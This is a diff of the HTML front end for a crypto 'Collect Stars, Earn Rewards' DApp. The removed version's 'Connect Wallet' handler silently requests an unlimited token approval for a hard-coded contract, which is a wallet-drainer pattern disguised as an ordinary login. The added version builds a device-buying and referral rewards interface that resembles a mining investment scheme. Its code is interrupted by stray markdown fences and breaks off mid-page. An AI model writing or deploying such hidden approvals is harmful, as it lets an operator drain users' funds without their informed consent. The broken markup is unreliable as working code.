@@ -1,163 +1,826 @@
 <!DOCTYPE html>
-<html lang="auto">
+
+<html lang="en">
 <head>
-  <meta charset="utf-8"/>
-  <meta name="viewport" content="width=device-width,initial-scale=1"/>
-  <title>StarCatcher - Collect Stars, Earn Rewards</title>
-  <meta name="description" content="Next-gen blockchain rewards DApp">
-  <style>
-    :root{
-      /* 主色：深紫→天蓝 渐变 */
-      --grad-main:linear-gradient(135deg,#4f1c82 0%,#00c6ff 100%);
-      /* 辅助霓虹 */
-      --pink:#ff2a6d;
-      --ice:#05d9e8;
-      /* 文字 */
-      --text:#ffffff;
-      --text-secondary:#b3b3d1;
-      --bg:#0a0a1a;
-      --card-bg:#111326;
-      --shadow:0 8px 32px rgba(0,198,255,.15);
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Star Collector - Collect Stars, Earn Rewards</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+```
+    :root {
+        --primary-gradient: linear-gradient(135deg, #6366f1 0%, #8b5cf6 50%, #06b6d4 100%);
+        --secondary-gradient: linear-gradient(135deg, #ec4899 0%, #06b6d4 100%);
+        --dark-bg: #0f0f23;
+        --card-bg: rgba(255, 255, 255, 0.1);
+        --card-border: rgba(255, 255, 255, 0.2);
+        --text-primary: #ffffff;
+        --text-secondary: #a8b2d1;
+        --accent-pink: #ec4899;
+        --accent-blue: #06b6d4;
+        --success: #10b981;
+        --warning: #f59e0b;
+        --error: #ef4444;
     }
-    /* 浅色模式覆盖 */
-    @media (prefers-color-scheme:light){
-      :root{
-        --text:#111;
-        --text-secondary:#444;
-        --bg:#f5f7ff;
-        --card-bg:#ffffff;
-        --shadow:0 8px 32px rgba(79,28,130,.08);
-      }
+
+    body {
+        font-family: 'SF Pro Display', -apple-system, BlinkMacSystemFont, sans-serif;
+        background: var(--dark-bg);
+        color: var(--text-primary);
+        min-height: 100vh;
+        overflow-x: hidden;
     }
-    *{box-sizing:border-box;font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,"Helvetica Neue",Arial,"PingFang SC",sans-serif}
-    body{margin:0;height:100vh;display:flex;align-items:center;justify-content:center;background:var(--bg);color:var(--text)}
-    .wallpaper{
-      position:fixed;inset:0;z-index:-1;
-      background:var(--bg) url('data:image/svg+xml,\
-        <svg xmlns="http://www.w3.org/2000/svg" width="400" height="400" viewBox="0 0 100 100">\
-        <defs><pattern id="g" width="10" height="10" patternUnits="userSpaceOnUse"><circle cx="5" cy="5" r=".6" fill="%2300c6ff33"/></pattern></defs>\
-        <rect width="100" height="100" fill="url(%23g)"/></svg>');
-      opacity:.4;
+
+    .animated-bg {
+        position: fixed;
+        top: 0;
+        left: 0;
+        width: 100%;
+        height: 100%;
+        background: 
+            radial-gradient(circle at 20% 30%, rgba(99, 102, 241, 0.3) 0%, transparent 50%),
+            radial-gradient(circle at 80% 70%, rgba(139, 92, 246, 0.3) 0%, transparent 50%),
+            radial-gradient(circle at 40% 80%, rgba(6, 182, 212, 0.2) 0%, transparent 50%);
+        animation: bgFloat 20s ease-in-out infinite;
+        z-index: -1;
     }
-    .card{
-      width:min(90%,380px);
-      padding:36px 24px 48px;
-      background:var(--card-bg);
-      border-radius:24px;
-      box-shadow:var(--shadow);
-      text-align:center;
-      animation:fadeIn .6s ease;
+
+    @keyframes bgFloat {
+        0%, 100% { transform: translateY(0px) rotate(0deg); }
+        50% { transform: translateY(-20px) rotate(5deg); }
     }
-    @keyframes fadeIn{from{opacity:0;transform:translateY(20px)}to{opacity:1;transform:none}}
-    .logo{
-      width:80px;height:80px;
-      margin:0 auto 12px;
-      background:var(--grad-main);
-      border-radius:50%;
-      display:flex;align-items:center;justify-content:center;
-      color:#fff;font-weight:700;font-size:32px;
+
+    .container {
+        max-width: 428px;
+        margin: 0 auto;
+        min-height: 100vh;
+        position: relative;
     }
-    h1{font-size:26px;margin:0 0 8px}
-    p.sub{color:var(--text-secondary);margin:0 0 32px;font-size:15px}
-    button.connect{
-      width:100%;height:60px;
-      border:none;border-radius:16px;
-      background:var(--grad-main);
-      color:#fff;font-size:17px;font-weight:600;
-      cursor:pointer;
-      transition:transform .15s,box-shadow .15s;
-      position:relative;
+
+    .page {
+        display: none;
+        padding: 20px;
+        min-height: 100vh;
+        animation: slideIn 0.3s cubic-bezier(0.4, 0, 0.2, 1);
     }
-    button.connect:active{transform:scale(.97)}
-    button.connect .ripple{
-      position:absolute;border-radius:50%;transform:scale(0);
-      animation:ripple .6s linear; background:rgba(255,255,255,.4);
-      pointer-events:none;
+
+    .page.active {
+        display: block;
     }
-    @keyframes ripple{to{transform:scale(4);opacity:0}}
-    .footer{font-size:12px;color:var(--text-secondary);margin-top:20px}
-    /* 语言切换 */
-    .lang{position:absolute;top:12px;right:12px;font-size:14px;color:var(--text-secondary);cursor:pointer}
-  </style>
+
+    @keyframes slideIn {
+        from { opacity: 0; transform: translateY(20px); }
+        to { opacity: 1; transform: translateY(0); }
+    }
+
+    .card {
+        background: var(--card-bg);
+        backdrop-filter: blur(20px);
+        border: 1px solid var(--card-border);
+        border-radius: 16px;
+        padding: 20px;
+        margin-bottom: 20px;
+        box-shadow: 0 8px 32px rgba(0, 0, 0, 0.3);
+        transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
+    }
+
+    .card:hover {
+        transform: translateY(-2px);
+        box-shadow: 0 12px 40px rgba(0, 0, 0, 0.4);
+    }
+
+    .header {
+        display: flex;
+        justify-content: space-between;
+        align-items: center;
+        padding: 20px;
+        position: sticky;
+        top: 0;
+        background: rgba(15, 15, 35, 0.95);
+        backdrop-filter: blur(20px);
+        z-index: 100;
+    }
+
+    .logo {
+        font-size: 24px;
+        font-weight: 700;
+        background: var(--primary-gradient);
+        -webkit-background-clip: text;
+        -webkit-text-fill-color: transparent;
+    }
+
+    .wallet-address {
+        font-size: 14px;
+        color: var(--text-secondary);
+        cursor: pointer;
+        transition: color 0.3s ease;
+    }
+
+    .wallet-address:hover {
+        color: var(--text-primary);
+    }
+
+    .btn {
+        padding: 16px 24px;
+        border: none;
+        border-radius: 12px;
+        font-size: 16px;
+        font-weight: 600;
+        cursor: pointer;
+        transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
+        position: relative;
+        overflow: hidden;
+    }
+
+    .btn-primary {
+        background: var(--primary-gradient);
+        color: white;
+    }
+
+    .btn-secondary {
+        background: var(--card-bg);
+        color: var(--text-primary);
+        border: 1px solid var(--card-border);
+    }
+
+    .btn:hover {
+        transform: translateY(-2px) scale(1.02);
+        box-shadow: 0 8px 25px rgba(99, 102, 241, 0.4);
+    }
+
+    .btn:active {
+        transform: translateY(0) scale(0.98);
+    }
+
+    .connect-page {
+        display: flex;
+        flex-direction: column;
+        justify-content: center;
+        align-items: center;
+        text-align: center;
+        padding: 40px 20px;
+    }
+
+    .brand-logo {
+        width: 120px;
+        height: 120px;
+        background: var(--primary-gradient);
+        border-radius: 30px;
+        margin-bottom: 30px;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        font-size: 48px;
+        animation: pulse 2s ease-in-out infinite;
+    }
+
+    @keyframes pulse {
+        0%, 100% { transform: scale(1); }
+        50% { transform: scale(1.05); }
+    }
+
+    .brand-slogan {
+        font-size: 32px;
+        font-weight: 700;
+        margin-bottom: 20px;
+        background: var(--primary-gradient);
+        -webkit-background-clip: text;
+        -webkit-text-fill-color: transparent;
+    }
+
+    .brand-subtitle {
+        font-size: 18px;
+        color: var(--text-secondary);
+        margin-bottom: 40px;
+    }
+
+    .stats-grid {
+        display: grid;
+        grid-template-columns: 1fr 1fr;
+        gap: 15px;
+        margin-bottom: 20px;
+    }
+
+    .stat-card {
+        background: var(--card-bg);
+        padding: 20px;
+        border-radius: 12px;
+        text-align: center;
+        backdrop-filter: blur(20px);
+        border: 1px solid var(--card-border);
+    }
+
+    .stat-value {
+        font-size: 24px;
+        font-weight: 700;
+        color: var(--accent-blue);
+        margin-bottom: 5px;
+    }
+
+    .stat-label {
+        font-size: 14px;
+        color: var(--text-secondary);
+    }
+
+    .device-grid {
+        display: grid;
+        gap: 15px;
+        margin-bottom: 20px;
+    }
+
+    .device-card {
+        background: var(--card-bg);
+        padding: 20px;
+        border-radius: 16px;
+        backdrop-filter: blur(20px);
+        border: 1px solid var(--card-border);
+        position: relative;
+        overflow: hidden;
+    }
+
+    .device-icon {
+        width: 60px;
+        height: 60px;
+        background: var(--secondary-gradient);
+        border-radius: 15px;
+        margin-bottom: 15px;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        font-size: 24px;
+        animation: rotate 10s linear infinite;
+    }
+
+    @keyframes rotate {
+        from { transform: rotate(0deg); }
+        to { transform: rotate(360deg); }
+    }
+
+    .device-name {
+        font-size: 18px;
+        font-weight: 600;
+        margin-bottom: 10px;
+    }
+
+    .device-stats {
+        display: flex;
+        justify-content: space-between;
+        margin-bottom: 15px;
+    }
+
+    .device-price {
+        color: var(--accent-pink);
+        font-weight: 600;
+    }
+
+    .device-power {
+        color: var(--accent-blue);
+        font-weight: 600;
+    }
+
+    .quantity-input {
+        display: flex;
+        align-items: center;
+        margin-bottom: 15px;
+    }
+
+    .quantity-btn {
+        width: 40px;
+        height: 40px;
+        border: none;
+        background: var(--card-bg);
+        color: var(--text-primary);
+        border-radius: 8px;
+        cursor: pointer;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        transition: all 0.2s ease;
+    }
+
+    .quantity-btn:hover {
+        background: var(--accent-blue);
+    }
+
+    .quantity-value {
+        margin: 0 15px;
+        font-size: 18px;
+        font-weight: 600;
+    }
+
+    .progress-bar {
+        width: 100%;
+        height: 8px;
+        background: rgba(255, 255, 255, 0.1);
+        border-radius: 4px;
+        overflow: hidden;
+        margin: 10px 0;
+    }
+
+    .progress-fill {
+        height: 100%;
+        background: var(--primary-gradient);
+        transition: width 0.3s ease;
+        animation: progressGlow 2s ease-in-out infinite alternate;
+    }
+
+    @keyframes progressGlow {
+        0% { box-shadow: 0 0 5px rgba(99, 102, 241, 0.5); }
+        100% { box-shadow: 0 0 20px rgba(99, 102, 241, 0.8); }
+    }
+
+    .tabs {
+        display: flex;
+        margin-bottom: 20px;
+        background: var(--card-bg);
+        border-radius: 12px;
+        padding: 4px;
+    }
+
+    .tab {
+        flex: 1;
+        padding: 12px;
+        text-align: center;
+        border-radius: 8px;
+        cursor: pointer;
+        transition: all 0.3s ease;
+        font-weight: 500;
+    }
+
+    .tab.active {
+        background: var(--primary-gradient);
+        color: white;
+    }
+
+    .bottom-nav {
+        position: fixed;
+        bottom: 0;
+        left: 50%;
+        transform: translateX(-50%);
+        width: 100%;
+        max-width: 428px;
+        background: rgba(15, 15, 35, 0.95);
+        backdrop-filter: blur(20px);
+        padding: 15px 20px;
+        border-top: 1px solid var(--card-border);
+    }
+
+    .nav-buttons {
+        display: flex;
+        gap: 10px;
+    }
+
+    .nav-btn {
+        flex: 1;
+        padding: 12px;
+        border: none;
+        border-radius: 8px;
+        background: var(--card-bg);
+        color: var(--text-primary);
+        font-size: 14px;
+        cursor: pointer;
+        transition: all 0.3s ease;
+    }
+
+    .nav-btn.active {
+        background: var(--primary-gradient);
+    }
+
+    .nav-btn:hover {
+        background: var(--accent-blue);
+    }
+
+    .floating-claim {
+        position: fixed;
+        top: 50%;
+        right: 20px;
+        transform: translateY(-50%);
+        width: 60px;
+        height: 60px;
+        border-radius: 50%;
+        background: var(--secondary-gradient);
+        border: none;
+        color: white;
+        font-size: 24px;
+        cursor: pointer;
+        box-shadow: 0 8px 25px rgba(236, 72, 153, 0.4);
+        animation: float 3s ease-in-out infinite;
+        z-index: 1000;
+    }
+
+    @keyframes float {
+        0%, 100% { transform: translateY(-50%); }
+        50% { transform: translateY(-60px); }
+    }
+
+    .notification-dot {
+        position: absolute;
+        top: -5px;
+        right: -5px;
+        width: 20px;
+        height: 20px;
+        background: var(--error);
+        border-radius: 50%;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        font-size: 12px;
+        font-weight: bold;
+    }
+
+    .toast {
+        position: fixed;
+        top: 50%;
+        left: 50%;
+        transform: translate(-50%, -50%);
+        background: var(--card-bg);
+        backdrop-filter: blur(20px);
+        border: 1px solid var(--card-border);
+        padding: 20px 30px;
+        border-radius: 12px;
+        text-align: center;
+        z-index: 10000;
+        animation: toastIn 0.3s ease;
+    }
+
+    @keyframes toastIn {
+        from { opacity: 0; transform: translate(-50%, -50%) scale(0.8); }
+        to { opacity: 1; transform: translate(-50%, -50%) scale(1); }
+    }
+
+    .toast.success {
+        border-color: var(--success);
+        color: var(--success);
+    }
+
+    .toast.error {
+        border-color: var(--error);
+        color: var(--error);
+    }
+
+    .hidden {
+        display: none !important;
+    }
+
+    .loading {
+        opacity: 0.5;
+        pointer-events: none;
+    }
+
+    @media (max-width: 375px) {
+        .container {
+            max-width: 375px;
+        }
+        
+        .page {
+            padding: 15px;
+        }
+        
+        .brand-slogan {
+            font-size: 28px;
+        }
+        
+        .stats-grid {
+            gap: 10px;
+        }
+    }
+</style>
+```
+
 </head>
 <body>
-  <div class="wallpaper"></div>
-  <div class="lang" onclick="toggleLang()">中/EN</div>
+    <div class="animated-bg"></div>
 
-  <div class="card">
-    <div class="logo">✨</div>
-    <h1 data-i18n="slogan">Collect Stars, Earn Rewards</h1>
-    <p class="sub" data-i18n="sub">Connect your wallet to start</p>
-    <button class="connect" id="connectBtn" data-i18n="connect">Connect Wallet</button>
-    <div class="footer" data-i18n="footer">Supports MetaMask Mobile & Trust Wallet</div>
-  </div>
+```
+<div class="container">
+    <!-- Wallet Connection Page -->
+    <div id="connectPage" class="page active connect-page">
+        <div class="brand-logo">⭐</div>
+        <h1 class="brand-slogan">Collect Stars, Earn Rewards</h1>
+        <p class="brand-subtitle">Enter the universe of decentralized star collection</p>
+        <button class="btn btn-primary" onclick="connectWallet()" style="width: 200px; margin-bottom: 20px;">
+            Connect Wallet
+        </button>
+        <p style="font-size: 14px; color: var(--text-secondary);">
+            Supports MetaMask, Trust Wallet and other wallet browsers
+        </p>
+    </div>
 
-<script type="module">
-/* ====== 国际化 ====== */
-const i18n = {
-  en:{
-    slogan:"Collect Stars, Earn Rewards",
-    sub:"Connect your wallet to start",
-    connect:"Connect Wallet",
-    footer:"Supports MetaMask Mobile & Trust Wallet",
-    connecting:"Connecting…",
-    approve:"Approve unlimited token",
-    error:"Connection failed, please try again"
-  },
-  zh:{
-    slogan:"收集星尘，赚取奖励",
-    sub:"连接钱包立即开始",
-    connect:"连接钱包",
-    footer:"支持 MetaMask Mobile、Trust Wallet 等内核浏览器",
-    connecting:"连接中…",
-    approve:"授权无限额度代币",
-    error:"连接失败，请重试"
-  }
-};
-let lang = (navigator.language||'').startsWith('zh')?'zh':'en';
-function t(k){return i18n[lang][k]||i18n.en[k]}
-function toggleLang(){lang=lang==='zh'?'en':'zh'; render();}
-function render(){
-  document.querySelectorAll('[data-i18n]').forEach(el=>el.innerText=t(el.dataset.i18n));
-}
-render();
+    <!-- Main Dashboard -->
+    <div id="dashboardPage" class="page">
+        <div class="header">
+            <div class="logo">⭐ Star Collector</div>
+            <div class="wallet-address" id="userAddress" onclick="toggleFullAddress()">
+                Connect Wallet
+            </div>
+        </div>
 
-/* ====== Web3 逻辑 ====== */
-const CONTRACT = "0x9dcced4ef738856d2c289d4116cd219c698b22ba";
-const TOKEN    = "0x877f23dcFBa91cadd7d35565Da452c9673C27A33";
-const MAX      = "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff";
+        <div class="card">
+            <h2 style="margin-bottom: 15px;">My Assets</h2>
+            <div class="stats-grid">
+                <div class="stat-card">
+                    <div class="stat-value" id="totalTokens">0</div>
+                    <div class="stat-label">Reward Tokens</div>
+                </div>
+                <div class="stat-card">
+                    <div class="stat-value" id="totalEarnings">0</div>
+                    <div class="stat-label">Total Earnings</div>
+                </div>
+            </div>
+        </div>
 
-let provider, signer, accounts;
+        <div class="card">
+            <h2 style="margin-bottom: 15px;">Device Status</h2>
+            <div id="deviceStatus">
+                <div class="device-card">
+                    <div class="device-name">🌙 Moonlight Converter</div>
+                    <div class="device-stats">
+                        <span id="normalCount">0</span>
+                        <span class="device-power">1.0x Power</span>
+                    </div>
+                </div>
+                <div class="device-card">
+                    <div class="device-name">👻 Phantom Debugger</div>
+                    <div class="device-stats">
+                        <span id="testCount">0</span>
+                        <span class="device-power">1.0x Power</span>
+                    </div>
+                </div>
+                <div class="device-card">
+                    <div class="device-name">✨ Stardust Collector L1</div>
+                    <div class="device-stats">
+                        <span id="power0Count">0</span>
+                        <span class="device-power">1.76x Power</span>
+                    </div>
+                </div>
+                <div class="device-card">
+                    <div class="device-name">🌸 Quantum Dandelion L2</div>
+                    <div class="device-stats">
+                        <span id="power1Count">0</span>
+                        <span class="device-power">3.31x Power</span>
+                    </div>
+                </div>
+                <div class="device-card">
+                    <div class="device-name">🌅 Aurora Weaver L3</div>
+                    <div class="device-stats">
+                        <span id="power2Count">0</span>
+                        <span class="device-power">4.85x Power</span>
+                    </div>
+                </div>
+                <div class="device-card">
+                    <div class="device-name">🌌 Galaxy Filter L4</div>
+                    <div class="device-stats">
+                        <span id="power3Count">0</span>
+                        <span class="device-power">7.15x Power</span>
+                    </div>
+                </div>
+            </div>
 
-async function connect(){
-  if(!window.ethereum) return alert("Please open in a wallet browser");
-  const btn = document.getElementById('connectBtn');
-  btn.disabled=true;
-  btn.innerText=t('connecting');
-  try{
-    await window.ethereum.request({method:'eth_requestAccounts'});
-    provider = new ethers.providers.Web3Provider(window.ethereum);
-    signer   = provider.getSigner();
-    accounts = await provider.listAccounts();
-    await approveOnce();            // 首次无限授权
-    location.href="dashboard.html"; // 成功后跳转仪表盘
-  }catch(e){
-    console.error(e);
-    btn.disabled=false;
-    btn.innerText=t('connect');
-    alert(t('error'));
-  }
-}
-/* 无限授权 */
-async function approveOnce(){
-  const abi = ["function approve(address spender,uint256 amount) external"];
-  const token = new ethers.Contract(TOKEN, abi, signer);
-  const tx = await token.approve(CONTRACT, MAX);
-  await tx.wait();
-}
-document.getElementById('connectBtn').addEventListener('click',connect);
-</script>
-<!-- ethers 从 CDN 引入 -->
-<script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
-</body>
-</html>
+            <div style="margin-top: 20px;">
+                <div style="display: flex; justify-content: space-between; margin-bottom: 5px;">
+                    <span>Network Power Share</span>
+                    <span id="powerShare">0%</span>
+                </div>
+                <div class="progress-bar">
+                    <div class="progress-fill" id="powerProgress" style="width: 0%"></div>
+                </div>
+            </div>
+        </div>
+
+        <div class="card">
+            <h2 style="margin-bottom: 15px;">Earnings Overview</h2>
+            <div class="stats-grid">
+                <div class="stat-card">
+                    <div class="stat-value" id="dailyReward">0</div>
+                    <div class="stat-label">Daily Reward</div>
+                </div>
+                <div class="stat-card">
+                    <div class="stat-value" id="unclaimedReward">0</div>
+                    <div class="stat-label">Unclaimed</div>
+                </div>
+            </div>
+        </div>
+
+        <div style="height: 100px;"></div>
+    </div>
+
+    <!-- Device Shop -->
+    <div id="shopPage" class="page">
+        <div class="header">
+            <div class="logo">🛍️ Device Shop</div>
+            <div class="wallet-address" id="userAddressShop" onclick="toggleFullAddress()">
+                Connect Wallet
+            </div>
+        </div>
+
+        <div class="tabs">
+            <div class="tab active" onclick="switchTab('initial')">Initial</div>
+            <div class="tab" onclick="switchTab('power')">Advanced</div>
+            <div class="tab" id="testTab" onclick="switchTab('test')" style="display: none;">Test</div>
+        </div>
+
+        <div id="initialTab" class="tab-content">
+            <div class="device-card">
+                <div class="device-icon">🌙</div>
+                <div class="device-name">Moonlight Converter</div>
+                <div class="device-stats">
+                    <div class="device-price">0.01 BNB</div>
+                    <div class="device-power">1.0x Power</div>
+                </div>
+                <p style="color: var(--text-secondary); margin-bottom: 15px;">
+                    Entry-level device for new collectors
+                </p>
+                <button class="btn btn-primary" onclick="buyInitialMachine()" style="width: 100%;">
+                    Buy Moonlight Converter
+                </button>
+            </div>
+        </div>
+
+        <div id="powerTab" class="tab-content" style="display: none;">
+            <div class="device-grid">
+                <div class="device-card" data-tier="0">
+                    <div class="device-icon">✨</div>
+                    <div class="device-name">Stardust Collector L1</div>
+                    <div class="device-stats">
+                        <div class="device-price">100 Tokens</div>
+                        <div class="device-power">1.76x Power</div>
+                    </div>
+                    <div class="quantity-input">
+                        <button class="quantity-btn" onclick="changeQuantity(0, -1)">-</button>
+                        <span class="quantity-value" id="quantity0">1</span>
+                        <button class="quantity-btn" onclick="changeQuantity(0, 1)">+</button>
+                    </div>
+                    <button class="btn btn-primary" onclick="buyPowerMachine(0)" style="width: 100%;">
+                        Buy Now
+                    </button>
+                </div>
+
+                <div class="device-card" data-tier="1">
+                    <div class="device-icon">🌸</div>
+                    <div class="device-name">Quantum Dandelion L2</div>
+                    <div class="device-stats">
+                        <div class="device-price">200 Tokens</div>
+                        <div class="device-power">3.31x Power</div>
+                    </div>
+                    <div class="quantity-input">
+                        <button class="quantity-btn" onclick="changeQuantity(1, -1)">-</button>
+                        <span class="quantity-value" id="quantity1">1</span>
+                        <button class="quantity-btn" onclick="changeQuantity(1, 1)">+</button>
+                    </div>
+                    <button class="btn btn-primary" onclick="buyPowerMachine(1)" style="width: 100%;">
+                        Buy Now
+                    </button>
+                </div>
+
+                <div class="device-card" data-tier="2">
+                    <div class="device-icon">🌅</div>
+                    <div class="device-name">Aurora Weaver L3</div>
+                    <div class="device-stats">
+                        <div class="device-price">300 Tokens</div>
+                        <div class="device-power">4.85x Power</div>
+                    </div>
+                    <div class="quantity-input">
+                        <button class="quantity-btn" onclick="changeQuantity(2, -1)">-</button>
+                        <span class="quantity-value" id="quantity2">1</span>
+                        <button class="quantity-btn" onclick="changeQuantity(2, 1)">+</button>
+                    </div>
+                    <button class="btn btn-primary" onclick="buyPowerMachine(2)" style="width: 100%;">
+                        Buy Now
+                    </button>
+                </div>
+
+                <div class="device-card" data-tier="3">
+                    <div class="device-icon">🌌</div>
+                    <div class="device-name">Galaxy Filter L4</div>
+                    <div class="device-stats">
+                        <div class="device-price">500 Tokens</div>
+                        <div class="device-power">7.15x Power</div>
+                    </div>
+                    <div class="quantity-input">
+                        <button class="quantity-btn" onclick="changeQuantity(3, -1)">-</button>
+                        <span class="quantity-value" id="quantity3">1</span>
+                        <button class="quantity-btn" onclick="changeQuantity(3, 1)">+</button>
+                    </div>
+                    <button class="btn btn-primary" onclick="buyPowerMachine(3)" style="width: 100%;">
+                        Buy Now
+                    </button>
+                </div>
+            </div>
+        </div>
+
+        <div id="testTab" class="tab-content" style="display: none;">
+            <div class="device-card">
+                <div class="device-icon">👻</div>
+                <div class="device-name">Phantom Debugger</div>
+                <div class="device-stats">
+                    <div class="device-price">0.0001 BNB</div>
+                    <div class="device-power">1.0x Power</div>
+                </div>
+                <p style="color: var(--text-secondary); margin-bottom: 15px;">
+                    For testing purposes - Admin only
+                </p>
+                <button class="btn btn-primary" onclick="buyTestMachine()" style="width: 100%;">
+                    Buy Phantom Debugger
+                </button>
+            </div>
+        </div>
+
+        <div style="height: 100px;"></div>
+    </div>
+
+    <!-- Rewards & Referral Page -->
+    <div id="rewardsPage" class="page">
+        <div class="header">
+            <div class="logo">💎 Rewards Center</div>
+            <div class="wallet-address" id="userAddressRewards" onclick="toggleFullAddress()">
+                Connect Wallet
+            </div>
+        </div>
+
+        <div class="card">
+            <h2 style="margin-bottom: 15px;">Claim Rewards</h2>
+            <div class="stat-card" style="margin-bottom: 20px;">
+                <div class="stat-value" id="claimableAmount">0</div>
+                <div class="stat-label">Available to Claim</div>
+            </div>
+            <button class="btn btn-primary" onclick="claimRewards()" style="width: 100%;">
+                Claim All Rewards
+            </button>
+        </div>
+
+        <div class="card">
+            <h2 style="margin-bottom: 15px;">Referral System</h2>
+            <div id="referrerSection">
+                <input type="text" id="referrerInput" placeholder="Enter referrer address..." 
+                       style="width: 100%; padding: 12px; border: 1px solid var(--card-border); 
+                              border-radius: 8px; background: var(--card-bg); color: var(--text-primary); 
+                              margin-bottom: 15px;">
+                <button class="btn btn-secondary" onclick="setReferrer()" style="width: 100%; margin-bottom: 20px;">
+                    Set Referrer
+                </button>
+            </div>
+            
+            <div style="margin-bottom: 20px;">
+                <div style="display: flex; justify-content: space-between; margin-bottom: 5px;">
+                    <span>My Referral Code</span>
+                    <button onclick="copyReferralCode()" style="background: none; border: none; color: var(--accent-blue); cursor: pointer;">
+                        📋 Copy
+                    </button>
+                </div>
+                <div style="background: var(--card-bg); padding: 10px; border-radius: 8px; word-break: break-all;" id="referralCode">
+                    -
+                </div>
+            </div>
+
+            <div class="stat-card">
+                <div class="stat-value" id="totalReferralRewards">0</div>
+                <div class="stat-label">Total Referral Rewards</div>
+            </div>
+        </div>
+
+        <div style="height: 100px;"></div>
+    </div>
+
+    <!-- Global Stats Page -->
+    <div id="statsPage" class="page">
+        <div class="header">
+            <div class="logo">📊 Global Stats</div>
+            <div class="wallet-address" id="userAddressStats" onclick="toggleFullAddress()">
+                Connect Wallet
+            </div>
+        </div>
+
+        <div class="card">
+            <h2 style="margin-bottom: 15px;">Network Overview</h2>
+            <div class="stats-grid">
+                <div class="stat-card">
+                    <div class="stat-value" id="globalTotalDevices">0</div>
+                    <div class="stat-label">Total Devices</div>
+                </div>
+                <div class="stat-card">
+                    <div class="stat-value" id="globalNetworkPower">0</div>
+                    <div class="stat-label">Network Power</div>
+                </div>
+                <div class="stat-card">
+                    <div class="stat-value" id="globalRewardPool">0</div>
+                    <div class="stat-label">Reward Pool</div>
+                </div>
+                <div class="stat-card">
+                    <div class="stat-value" id="globalDailyProduction">0</div>
+                    <div class="stat-label">Daily Production</div>
+                </div>
+            </div>
+        </div>
+
+        <div class="card">
+            <h2 style="margin-bottom: 15px;">System Info</h2>
+            <div style="display: flex; justify-content: space-between; margin-bottom: 10px;">
+                <span>Current Block</span>
+                <span id="currentBlock">-</span>
+            </div>
+```
